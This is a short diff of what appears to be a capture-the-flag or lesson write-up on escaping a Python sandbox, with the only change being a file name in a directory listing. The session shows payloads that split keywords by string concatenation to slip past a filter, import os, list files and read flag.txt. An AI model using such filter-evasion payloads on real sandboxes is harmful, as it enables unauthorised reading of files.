@@ -57,7 +57,7 @@ for supporting Python development.  See www.python.org for more information., 'l
 aaa
 
 >>> print(getattr(__builtins__.__dict__["__imp" + "ort__"]("o" + "s"), "listdir")())
-['__pycache__', 'secret.txt', 'ftp_client.py', 'Lesson9_3.py', 'Lesson9_1.py', 'Lesson9_2.py', 'passwd', 'simple_sandbox.py', 'flag.txt']
+['__pycache__', 'secret.txt', 'ftp_client.py', 'Lesson9_3.py', 'ssh_connect.py', 'Lesson9_2.py', 'passwd', 'simple_sandbox.py', 'flag.txt']
 
 >>> print(getattr(__builtins__.__dict__["op" + "en"]("flag.txt"), "re" + "ad")())
 FLAG!!!!
